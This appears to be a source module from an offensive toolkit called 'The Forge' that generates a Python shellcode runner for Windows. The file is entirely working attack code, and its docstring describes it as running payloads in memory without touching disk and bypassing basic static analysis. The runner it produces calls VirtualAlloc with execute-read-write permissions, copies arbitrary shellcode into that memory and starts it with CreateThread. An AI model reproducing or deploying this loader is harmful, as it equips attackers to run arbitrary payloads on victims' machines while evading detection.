"""
The Forge — Ghost Shellcode Runner
Executes raw shellcode directly in memory without touching disk using ctypes.
Bypasses basic static analysis.
"""

import textwrap

def generate_python(shellcode_hex: str = "90909090c3") -> str:
    """Python-based in-memory shellcode runner using VirtualAlloc/CreateThread."""
    code = textwrap.dedent(f"""\
        import ctypes
        import platform
        import struct

        # Generated by The Forge
        # Shellcode: {shellcode_hex[:20]}...

        def execute_shellcode(hex_code):
            if platform.system() != "Windows":
                return "[-] Shellcode runner only supports Windows."
                
            try:
                # Resolve APIs
                kernel32 = ctypes.windll.kernel32
                
                # Setup shellcode payload
                shellcode = bytes.fromhex(hex_code)
                code_len = len(shellcode)
                
                # VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
                ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(code_len), ctypes.c_int(0x3000), ctypes.c_int(0x40))
                
                # Move memory
                buf = (ctypes.c_char * code_len).from_buffer_copy(shellcode)
                kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(code_len))
                
                # CreateThread(NULL, 0, ptr, NULL, 0, NULL)
                ht = kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
                
                # WaitForSingleObject(ht, INFINITE)
                kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
                return "[+] Shellcode executed successfully."
            except Exception as e:
                return str(e)

        if __name__ == "__main__":
            execute_shellcode("{shellcode_hex}")
    """)
    return code

VARIANTS = {
    "python": generate_python,
}

def generate(language: str = "python", **kwargs) -> str:
    return VARIANTS[language](**kwargs)

def list_variants() -> list[str]:
    return list(VARIANTS.keys())
